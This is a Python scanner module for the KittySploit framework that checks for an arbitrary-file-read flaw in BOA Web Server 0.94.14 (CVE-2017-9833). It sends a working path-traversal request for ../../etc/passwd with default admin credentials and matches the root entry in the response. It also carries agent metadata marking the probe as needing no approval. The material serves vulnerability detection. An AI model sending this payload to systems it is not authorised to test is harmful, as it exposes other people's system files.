#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""BOA Web Server 0."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'BOA Web Server 0.94.14 - Arbitrary File Access Detection',
        'description': 'BOA Web Server 0.94.14 is susceptible to arbitrary file access. The server allows the injection of "../.." using the FILECAMERA variable sent by GET to read files with root privileges and without using access credentials.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'boa', 'lfr', 'lfi', 'edb', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/42290',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-9833',
            'https://pastebin.com/raw/rt7LJvyF',
            'https://www.exploit-db.com/exploits/42290/',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2017-9833',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/passwd%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=admin&PWD=admin&PIC_SIZE=0', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="BOA Web Server 0.94.14 - Arbitrary File Access detected",
                path='/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/passwd%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=admin&PWD=admin&PIC_SIZE=0',
            )
            return True
        return False

